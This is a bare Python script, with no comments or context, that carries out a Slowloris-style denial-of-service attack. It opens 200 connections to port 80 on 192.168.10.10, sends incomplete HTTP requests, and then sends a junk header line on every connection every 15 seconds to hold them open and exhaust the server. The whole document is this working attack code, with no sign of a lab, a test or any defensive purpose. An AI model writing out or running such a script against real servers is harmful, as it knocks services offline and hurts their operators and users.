import socket
import time

sockets = []
for _ in range(200):
    try:
        s = socket.socket()
        s.connect(('192.168.10.10', 80))
        s.send(b'GET / HTTP/1.1\r\nHost: 192.168.10.10\r\n')
        sockets.append(s)
    except Exception:
        pass

while True:
    for s in sockets:
        try:
            s.send(b'X-a: b\r\n')
        except Exception:
            pass
    time.sleep(15)